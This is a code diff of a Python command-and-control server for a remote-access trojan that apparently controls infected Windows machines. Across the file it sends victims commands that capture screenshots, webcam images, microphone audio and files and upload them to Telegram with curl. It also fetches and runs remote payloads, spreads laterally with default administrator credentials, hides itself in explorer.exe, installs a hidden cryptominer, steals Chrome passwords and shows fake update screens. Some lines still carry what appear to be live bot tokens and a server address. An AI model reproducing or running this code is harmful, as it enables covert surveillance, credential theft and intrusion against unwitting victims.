@@ -12,13 +12,14 @@ version = 11.7 #7/3/2026
 HOST = "0.0.0.0"
 PORT = 5000
 
-CHAT_ID = "6042298920"
+#Telegram
+CHAT_ID = ""
 
 
 
 
 def tel_logger(log):
-    url = f"https://api.telegram.org/bot8282137342:AAFd93wSzwEVliRmm2kSc1AWUf1tqv68Tv0/sendMessage"
+    url = f"https://api.telegram.org/TOKEN/sendMessage"
     data = {
         'chat_id': CHAT_ID,
         'text': log
@@ -27,7 +28,7 @@ def tel_logger(log):
 
 
 def send_log2(log):
-    url = f"https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendMessage"
+    url = f"https://api.telegram.org/TOKEN/sendMessage"
     data = {
         'chat_id': CHAT_ID,
         'text': log
@@ -36,7 +37,6 @@ def send_log2(log):
 
 
 class ConnectionHealth:
-    """Track connection quality and performance"""
 
     def __init__(self):
         self.latency = []
@@ -46,7 +46,6 @@ class ConnectionHealth:
         self.connection_quality = 100
 
     def record_command(self, success, response_time):
-        """Track command success/failure"""
         if success:
             self.successful_commands += 1
             self.latency.append(response_time)
@@ -58,7 +57,6 @@ class ConnectionHealth:
         self.update_quality()
 
     def update_quality(self):
-        """Calculate connection quality score"""
         total = self.successful_commands + self.failed_commands
         if total == 0:
             return
@@ -66,16 +64,13 @@ class ConnectionHealth:
         success_rate = (self.successful_commands / total) * 100
         avg_latency = sum(self.latency) / len(self.latency) if self.latency else 0
 
-        # Quality = 70% success rate + 30% latency score
         latency_score = max(0.0, 100 - (avg_latency / 10))
         self.connection_quality = (success_rate * 0.7) + (latency_score * 0.3)
 
     def get_avg_latency(self):
-        """Get average response time"""
         return sum(self.latency) / len(self.latency) if self.latency else 0
 
     def get_stats(self):
-        """Get formatted stats"""
         return {
             'quality': f"{self.connection_quality:.1f}%",
             'latency': f"{self.get_avg_latency():.2f}s",
@@ -96,11 +91,11 @@ class ClientManager:
             self.client_counter += 1
             client_id = self.client_counter
 
-            # Get credentials from client
+            #Get credentials from client
             try:
                 conn.settimeout(15.0)
 
-                # Receive password
+                #Receive password
                 password_data = self._recv_message(conn)
                 if not password_data:
                     conn.close()
@@ -112,7 +107,7 @@ class ClientManager:
                     conn.close()
                     return None
 
-                # receive username
+                #receive username
                 username_data = self._recv_message(conn)
                 if username_data:
                     username = username_data.decode('utf-8', errors='ignore').strip()
@@ -126,15 +121,12 @@ class ClientManager:
                     pass
                 return None
 
-            # NEW: Check for duplicate username+IP and remove old connection
             duplicate_id = None
-            was_connected_to_duplicate = False  # Track if user was interacting with old client
+            was_connected_to_duplicate = False
 
             for cid, client in list(self.clients.items()):
                 if client['username'] == username and client['addr'][0] == addr[0]:
                     duplicate_id = cid
-                    # Check if this client has an active interaction (lock is being held)
-                    # We'll set a flag to auto-reconnect
                     break
 
             if duplicate_id:
@@ -146,7 +138,6 @@ class ClientManager:
                 old_client = self.clients[duplicate_id]
                 old_client['active'] = False
 
-                # Store the new client_id for auto-reconnect
                 old_client['replacement_id'] = client_id
 
                 try:
@@ -155,7 +146,6 @@ class ClientManager:
                     pass
                 del self.clients[duplicate_id]
 
-                # Print message to help user know to reconnect
                 print(f"[*] Old session disconnected. New session is ID: {client_id}")
 
             client_info = {
@@ -176,7 +166,7 @@ class ClientManager:
             self.clients[client_id] = client_info
             print(f"[+] New client connected: {username}@{addr[0]} (ID: {client_id})")
 
-            # Send notifications
+            #Send notifications
             def send_hi():
                 url = f"https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendMessage"
                 data = {
@@ -189,7 +179,7 @@ class ClientManager:
             send_hi()
 
             def send_log():
-                url = f"https://api.telegram.org/bot8282137342:AAFd93wSzwEVliRmm2kSc1AWUf1tqv68Tv0/sendMessage"
+                url = f"https://api.telegram.org/TOKEN/sendMessage"
                 data = {
                     'chat_id': CHAT_ID,
                     'text': "New client connected!"
@@ -218,7 +208,7 @@ class ClientManager:
                 print(f"[-] Client disconnected: {client['username']}@{client['addr'][0]} (ID: {client_id})")
 
                 def send_log1():
-                    url = f"https://api.telegram.org/bot8282137342:AAFd93wSzwEVliRmm2kSc1AWUf1tqv68Tv0/sendMessage"
+                    url = f"https://api.telegram.org/TOKEN/sendMessage"
                     data = {
                         'chat_id': CHAT_ID,
                         'text': "Client disconnected!"
@@ -281,10 +271,10 @@ class ClientManager:
             if isinstance(data, str):
                 data = data.encode('utf-8')
 
-            # Send length (4 bytes)
+            #Send length (4 bytes)
             msg_len = len(data)
             conn.sendall(struct.pack('!I', msg_len))
-            # Send data
+            #Send data
             conn.sendall(data)
             return True
         except Exception as e:
@@ -292,14 +282,13 @@ class ClientManager:
             return False
 
     def _recv_message(self, conn):
-        """Receive data with length prefix"""
         try:
-            # Receive the length (4 bytes)
+            #Receive the length (4 bytes)
             raw_msglen = self._recv_exactly(conn, 4)
             if not raw_msglen:
                 return None
 
-            # Check if it's HTTP request
+            #Check HTTP
             if raw_msglen.startswith(b'GET ') or raw_msglen.startswith(b'POST') or raw_msglen.startswith(
                     b'HTTP') or raw_msglen.startswith(b'HEAD'):
                 return None  # Silent close
@@ -307,19 +296,17 @@ class ClientManager:
             try:
                 msglen = struct.unpack('!I', raw_msglen)[0]
             except struct.error:
-                return None  # Silent close for invalid format
+                return None
 
-            # Sanity check for message length
             if msglen > 10 * 1024 * 1024:  # 10MB limit
                 return None  # Silent close
 
-            # Receive the actual message
+            #Receive the actual message
             return self._recv_exactly(conn, msglen)
         except:
             return None
 
     def _recv_exactly(self, conn, n):
-        """Helper to receive exactly n bytes"""
         data = b''
         while len(data) < n:
             try:
@@ -335,7 +322,6 @@ class ClientManager:
 
 
 def handle_client_connection(client_manager, conn, addr):
-    """Handle individual client connection"""
     client_id = None
     keepalive_thread = None
     keepalive_event = threading.Event()
@@ -345,9 +331,8 @@ def handle_client_connection(client_manager, conn, addr):
         if not client_id:
             return
 
-        conn.settimeout(300.0)  # 5 minutes timeout
+        conn.settimeout(300.0)  #5 minS timeout
 
-        # Start keepalive in separate thread
         keepalive_thread = threading.Thread(
             target=keepalive_handler,
             args=(client_manager, client_id, keepalive_event),
@@ -355,15 +340,12 @@ def handle_client_connection(client_manager, conn, addr):
         )
         keepalive_thread.start()
 
-        # Simple approach: just keep the connection alive
-        # The real interaction happens in interact_with_client function
         while True:
             try:
                 client = client_manager.get_client(client_id)
                 if not client or not client['active']:
                     break
 
-                # Just sleep and check periodically
                 time.sleep(5)
 
             except Exception as e:
@@ -377,7 +359,6 @@ def handle_client_connection(client_manager, conn, addr):
         traceback.print_exc()
         tel_logger(f"[!] Connection handler error: {e}\n{traceback.format_exc()}")
     finally:
-        # Signal keepalive thread to stop
         if keepalive_thread:
             keepalive_event.set()
 
@@ -387,7 +368,6 @@ def handle_client_connection(client_manager, conn, addr):
 
 
 def keepalive_handler(client_manager, client_id, stop_event):
-    """Separate thread for handling keepalive"""
     if stop_event.wait(10):
         return
 
@@ -439,8 +419,7 @@ def keepalive_handler(client_manager, client_id, stop_event):
                 except:
                     pass
 
-            # Wait before next keepalive, but check for stop event
-            for _ in range(15):  # Check every 2 seconds for 30 seconds total
+            for _ in range(15):  #Check every 2 seconds for 30 seconds total
                 if stop_event.wait(2):
                     return
 
@@ -452,7 +431,6 @@ def keepalive_handler(client_manager, client_id, stop_event):
 
 
 def show_clients(client_manager):
-    """Display list of connected clients"""
     clients = client_manager.list_clients()
     if not clients:
         print("\n[!] No clients connected.")
@@ -471,7 +449,6 @@ def show_clients(client_manager):
 
 
 def interact_with_client(client_manager, client_id):
-    """Interactive shell session with selected client"""
     client = client_manager.get_client(client_id)
     if not client:
         print(f"[!] Client {client_id} not found.")
@@ -489,13 +466,13 @@ def interact_with_client(client_manager, client_id):
     stats = health.get_stats()
     print(f"[Health] Quality: {stats['quality']} | Latency: {stats['latency']} | Commands: {stats['total_commands']}")
 
-    # Start health monitoring thread
+    #Start health monitoring thread
     health_stop = threading.Event()
 
     def health_monitor():
         """Display health stats every 2.5 minutes"""
         while not health_stop.is_set():
-            if health_stop.wait(150):  # 2.5 minutes = 150 seconds
+            if health_stop.wait(150):  #2.5 minutes = 150 secondS
                 break
             stats = health.get_stats()
             print(
@@ -505,32 +482,30 @@ def interact_with_client(client_manager, client_id):
     health_thread.start()
 
     try:
-        # Set timeout for interactive commands
+        #Set timeout for interactive commands
         original_timeout = conn.gettimeout()
         conn.settimeout(120.0)
     except:
         pass
 
     try:
-        # Set timeout for interactive commands
+        #Set timeout for interactive commands
         original_timeout = conn.gettimeout()
         conn.settimeout(300.0)
 
         while True:
-            # Check if client is still connected
+            #Check if client is still connected
             if not client_manager.is_client_connected(client_id):
                 print("[!] Client disconnected")
 
-                # NEW: Check if there's a replacement connection
                 replacement_id = client.get('replacement_id')
                 if replacement_id and client_manager.is_client_connected(replacement_id):
                     print(f"[+] Detected new connection from same client (ID: {replacement_id})")
                     print(f"[+] Auto-switching to new connection...")
                     time.sleep(1)
-                    # Recursively connect to the new client
                     return interact_with_client(client_manager, replacement_id)
                 else:
-                    # Check if a new client with same username/IP exists
+                    #Check if a new client with same username/IP exists
                     clients = client_manager.list_clients()
                     for cid, c in clients.items():
                         if c['username'] == username and c['addr'][0] == addr[0]:
@@ -546,9 +521,8 @@ def interact_with_client(client_manager, client_id):
             if cmd.lower() == 'back':
                 break
             elif cmd.lower() == 'exit':
-                # Send exit command to client
                 if client_manager._send_message(conn, f"CMD:{cmd}"):
-                    time.sleep(1)  # Give client time to process
+                    time.sleep(1)
                 return 'exit'
             elif cmd == 'screenshot':
                 command2 = (
@@ -576,7 +550,7 @@ def interact_with_client(client_manager, client_id):
                     tel_logger(f'Screenshot Taken [{username}]')
                     client['command_in_progress'] = False
 
-                command3 = f'curl -F "photo=@{path2}" https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendPhoto?chat_id=6042298920'
+                command3 = f'curl -F "photo=@{path2}" https://api.telegram.org/TOKEN/sendPhoto?chat_id=6042298920'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command3}"):
@@ -589,7 +563,7 @@ def interact_with_client(client_manager, client_id):
 
             elif cmd == 'send':
                 path = input("FULL Path of file: ")
-                command2 = f'curl -F "document=@{path}" https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendDocument?chat_id=6042298920'
+                command2 = f'curl -F "document=@{path}" https://api.telegram.org/TOKEN/sendDocument?chat_id=6042298920'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
@@ -635,7 +609,7 @@ def interact_with_client(client_manager, client_id):
                     print(response.decode('utf-8', errors='ignore'))
                     tel_logger(f"CameraShoot Taken [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
-                command4 = 'curl -F "document=@%USERPROFILE%/webcam.jpg" https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendDocument?chat_id=6042298920'
+                command4 = 'curl -F "document=@%USERPROFILE%/webcam.jpg" https://api.telegram.org/TOKEN/sendDocument?chat_id=6042298920'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command4}"):
@@ -792,7 +766,7 @@ def interact_with_client(client_manager, client_id):
                     print(response.decode('utf-8', errors='ignore'))
                     tel_logger(f"Audio Record Finished for [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
 
-                command3 = 'curl -F "document=@%USERPROFILE%\\mic.wav" https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendDocument?chat_id=6042298920'
+                command3 = 'curl -F "document=@%USERPROFILE%\\mic.wav" https://api.telegram.org/TOKEN/sendDocument?chat_id=6042298920'
                 with client['lock']:
                     if not client_manager._send_message(conn, f"CMD:{command3}"):
                         client['command_in_progress'] = False
@@ -805,7 +779,7 @@ def interact_with_client(client_manager, client_id):
                     client['command_in_progress'] = False
 
             elif cmd == 'ffmpeg':
-                command2 = r'curl http://81.10.55.8/ffmpeg.rar -o "%USERPROFILE%\ffmpeg.rar"'
+                command2 = r'curl http://SERVER IP/ffmpeg.rar -o "%USERPROFILE%\ffmpeg.rar"'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
@@ -876,7 +850,7 @@ def interact_with_client(client_manager, client_id):
 
             elif cmd == 'inject':
                 name = input("FULL name of file: ")
-                command2 = f'curl -O http://81.10.55.8/{name} && start /B "" "{name}"'
+                command2 = f'curl -O http://server IP/{name} && start /B "" "{name}"'
                 with client['lock']:
                     client['command_in_progress'] = True
                     if not client_manager._send_message(conn, f"CMD:{command2}"):
@@ -1357,13 +1331,10 @@ def interact_with_client(client_manager, client_id):
                     $ip = \\"$subnet.$_\\";
                     if(Test-Connection $ip -Count 1 -Quiet) {
                         try {
-                            # Try default credentials
                             $cred = New-Object System.Management.Automation.PSCredential('Administrator', (ConvertTo-SecureString 'admin' -AsPlainText -Force));
 
-                            # Copy payload
                             Copy-Item '%APPDATA%\\MicrosoftUpdate\\defender.exe' \\\\\\\\$ip\\\\C$\\\\Windows\\\\Temp\\\\update.exe;
 
-                            # Execute remotely
                             Invoke-WmiMethod -ComputerName $ip -Credential $cred -Class Win32_Process -Name Create -ArgumentList 'C:\\\\Windows\\\\Temp\\\\update.exe';
                         } catch {}
                     }
@@ -1502,11 +1473,9 @@ def interact_with_client(client_manager, client_id):
                 if action == 'hide':
                     command2 = '''
             powershell -Command "
-            # Hide from Task Manager
             $proc = Get-Process -Id $PID
             $proc.PriorityClass = 'Idle'
 
-            # Inject into explorer.exe
             $code = @'
             [DllImport(\\"kernel32.dll\\")]
             public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
@@ -1523,10 +1492,8 @@ def interact_with_client(client_manager, client_id):
 
             Add-Type -MemberDefinition $code -Name 'Rootkit' -Namespace 'Win32'
 
-            # Get explorer.exe
             $explorer = Get-Process -Name explorer | Select -First 1
 
-            # Open process
             $hProcess = [Win32.Rootkit]::OpenProcess(0x1F0FFF, $false, $explorer.Id)
 
             Write-Output 'Process hidden in explorer.exe'
@@ -1556,18 +1523,15 @@ def interact_with_client(client_manager, client_id):
                     threads = input("CPU threads to use (default 2): ") or "2"
 
                     command2 = f'''
-            # Download XMRig miner
             $minerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-msvc-win64.zip"
             $minerZip = "$env:TEMP\\miner.zip"
             $minerDir = "$env:APPDATA\\MicrosoftUpdate\\miner"
 
             Invoke-WebRequest -Uri $minerUrl -OutFile $minerZip
 
-            # Extract
             Expand-Archive -Path $minerZip -DestinationPath $minerDir -Force
             Remove-Item $minerZip
 
-            # Create config
             $config = @{{
                 "autosave" = $true
                 "cpu" = @{{
@@ -1586,7 +1550,6 @@ def interact_with_client(client_manager, client_id):
 
             $config | Out-File "$minerDir\\config.json" -Encoding UTF8
 
-            # Start miner hidden
             Start-Process "$minerDir\\xmrig.exe" -ArgumentList "--config=$minerDir\\config.json" -WindowStyle Hidden
 
             Write-Output "Mining started with {threads} threads"
@@ -1638,7 +1601,6 @@ def interact_with_client(client_manager, client_id):
             $textPath = '$env:TEMP\\print.txt'
             $text | Out-File -FilePath $textPath -Encoding UTF8
 
-            # Print to all printers
             Get-Printer | ForEach-Object {{
                 try {{
                     for ($i = 0; $i -lt {copies}; $i++) {{
@@ -1712,7 +1674,6 @@ def interact_with_client(client_manager, client_id):
                     client['command_in_progress'] = False
 
             elif cmd == 'chrome_pass':
-                # First, send the Python script to client
                 script = '''
             import os,json,base64,sqlite3,shutil
             from Crypto.Cipher import AES
@@ -1753,20 +1714,19 @@ def interact_with_client(client_manager, client_id):
             print(output)
             '''
 
-                # Save script to temp file
+                #Save script to temp file
                 command1 = f'echo {base64.b64encode(script.encode()).decode()} > %TEMP%\\cp.b64'
                 command2 = 'certutil -decode %TEMP%\\cp.b64 %TEMP%\\chrome_pass.py'
 
-                # Install dependencies
                 command3 = 'pip install pycryptodome pywin32 --break-system-packages'
 
-                # Run script
+                #Run script
                 command4 = 'python %TEMP%\\chrome_pass.py > %TEMP%\\chrome_passwords.txt'
 
-                # Send results
+                #Send results
                 command5 = f'curl -F "document=@%TEMP%\\chrome_passwords.txt" https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendDocument?chat_id={CHAT_ID}'
 
-                # Execute all commands in sequence
+                #Execute all commands in sequence
                 for cmd_exec in [command1, command2, command3, command4, command5]:
                     with client['lock']:
                         client['command_in_progress'] = True
@@ -1788,7 +1748,7 @@ def interact_with_client(client_manager, client_id):
                     html_content = '''<!DOCTYPE html><html><head><title>Windows Update</title><style>body{background:#0078d7;color:white;font-family:"Segoe UI",sans-serif;display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;margin:0}.spinner{border:8px solid rgba(255,255,255,0.3);border-top:8px solid white;border-radius:50%;width:80px;height:80px;animation:spin 1s linear infinite;margin-bottom:40px}keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}h1{font-size:48px;margin:20px 0}p{font-size:24px;margin:10px 0}.progress{width:400px;height:4px;background:rgba(255,255,255,0.3);margin-top:20px}.progress-bar{height:100%;background:white;width:0%;animation:progress 600s linear forwards}keyframes progress{to{width:100%}}</style></head><body><div class="spinner"></div><h1>Working on updates</h1><p id="percent">0% complete</p><p>Do not turn off your PC. This will take a while.</p><div class="progress"><div class="progress-bar"></div></div><script>let percent=0;setInterval(()=>{percent+=Math.random()*0.5;if(percent>99)percent=99;document.getElementById("percent").textContent=Math.floor(percent)+"% complete"},3000)</script></body></html>'''
                 elif update_type == 'chrome':
                     html_content = '''<!DOCTYPE html><html><head><title>Chrome Update</title><style>body{background:white;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.container{text-align:center;max-width:400px}.chrome-logo{width:100px;height:100px;margin-bottom:30px}h2{color:#333;margin:20px 0}.progress{width:300px;height:6px;background:#e0e0e0;border-radius:3px;margin:20px auto;overflow:hidden}.progress-bar{height:100%;background:#4285f4;width:0%;animation:progress 300s linear forwards}keyframes progress{to{width:100%}}</style></head><body><div class="container"><svg class="chrome-logo" viewBox="0 0 100 100"><circle cx="50" cy="50" r="45" fill="#4285f4"/><circle cx="50" cy="50" r="30" fill="white"/><circle cx="50" cy="50" r="20" fill="#4285f4"/></svg><h2>Updating Google Chrome</h2><p>Please wait while Chrome updates to the latest version...</p><div class="progress"><div class="progress-bar"></div></div><p id="status">Downloading update...</p></div><script>setTimeout(()=>document.getElementById("status").textContent="Installing update...",30000);setTimeout(()=>document.getElementById("status").textContent="Finishing up...",60000)</script></body></html>'''
-                else:  # office
+                else:
                     html_content = '''<!DOCTYPE html><html><head><title>Office Update</title><style>body{background:#f3f3f3;font-family:"Segoe UI",sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.container{background:white;padding:50px;border-radius:8px;box-shadow:0 4px 6px rgba(0,0,0,0.1);text-align:center}h2{color:#d83b01}.spinner{border:4px solid #f3f3f3;border-top:4px solid #d83b01;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto}keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style></head><body><div class="container"><h2>Microsoft Office</h2><div class="spinner"></div><p>Updating Office applications...</p><p>This may take several minutes</p></div></body></html>'''
                 html_escaped = html_content.replace("'", "''")
 
@@ -1967,7 +1927,7 @@ def interact_with_client(client_manager, client_id):
             elif cmd == "":
                 continue
             else:
-                # Send command with CMD prefix
+                #Send command with CMD prefix
                 start_time = time.time()
                 with client['lock']:
                     client['command_in_progress'] = True
@@ -1978,7 +1938,7 @@ def interact_with_client(client_manager, client_id):
                         client['health'].record_command(False, 0)
                         break
 
-                    # Receive response
+                    #Receive response
                     response = client_manager._recv_message(conn)
 
                 response_time = time.time() - start_time
@@ -2007,7 +1967,6 @@ def interact_with_client(client_manager, client_id):
 
     finally:
         health_stop.set()
-        # Restore original timeout
         try:
             conn.settimeout(original_timeout)
         except:
@@ -2019,7 +1978,6 @@ def interact_with_client(client_manager, client_id):
 def main():
     client_manager = ClientManager()
 
-    # Start dashboard in background thread
     try:
         from dashboard import start_dashboard
 
@@ -2030,31 +1988,29 @@ def main():
         )
         dashboard_thread.start()
 
-        time.sleep(2)  # Let it initialize
+        time.sleep(2)
 
     except Exception as e:
         print(f"[!] Dashboard error: {e}")
         print("[*] Continuing without dashboard...")
 
-    # Setup server socket
+    #Setup server socket
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
         s.bind((HOST, PORT))
-        s.listen(10)  # Increased backlog
+        s.listen(10)
     except Exception as e:
         print(f"[!] Failed to setup server: {e}")
         return
 
     print(f"\n[+] Listening on 81.10.55.8:{PORT}")
 
-    # Start accepting connections in background
     def accept_connections():
         while True:
             try:
                 conn, addr = s.accept()
-                # Set socket options for new connection
                 conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
 
                 thread = threading.Thread(
@@ -2070,7 +2026,6 @@ def main():
     accept_thread = threading.Thread(target=accept_connections, daemon=True)
     accept_thread.start()
 
-    # Main command loop
     try:
         while True:
             print("\n" + "=" * 50)
@@ -2128,7 +2083,6 @@ def main():
 
                     continue
 
-                # Define commands that require user input (NOT ALLOWED in broadcast)
 
                 interactive_commands = [
 
@@ -2156,7 +2110,6 @@ def main():
 
                     continue
 
-                # Handle special commands that need parameters
 
                 actual_commands = []
 
@@ -2197,7 +2150,6 @@ def main():
 
                         continue
 
-                    # Escape quotes
 
                     message = message.replace("'", "''").replace('"', '`"')
 
@@ -2253,7 +2205,6 @@ def main():
 
                 else:
 
-                    # Check if it's a predefined quick command
 
                     command_map = {
 
@@ -2319,7 +2270,6 @@ def main():
 
                 def send_to_client(cid):
 
-                    """Send command(s) to a single client"""
 
                     client = client_manager.get_client(cid)
 
@@ -2340,8 +2290,6 @@ def main():
 
                             client['command_in_progress'] = True
 
-                            # Execute each command in sequence
-
                             for command in actual_commands:
 
                                 if not client_manager._send_message(conn, f"CMD:{command}"):
@@ -2361,7 +2309,6 @@ def main():
 
                                     all_outputs.append("[No response]")
 
-                            # Store result
 
                             results[cid] = {
 
@@ -2379,7 +2326,6 @@ def main():
 
                         client['command_in_progress'] = False
 
-                # Launch threads for all clients
 
                 for client_id in clients:
                     thread = threading.Thread(target=send_to_client, args=(client_id,))
@@ -2388,12 +2334,10 @@ def main():
 
                     threads.append(thread)
 
-                # Wait for all to complete (with timeout)
 
                 for thread in threads:
-                    thread.join(timeout=300)  # 5 Minuets timeout per client
+                    thread.join(timeout=300)  #5 Minuets timeout per client
 
-                # Display results
 
                 print("\n" + "=" * 70)
 
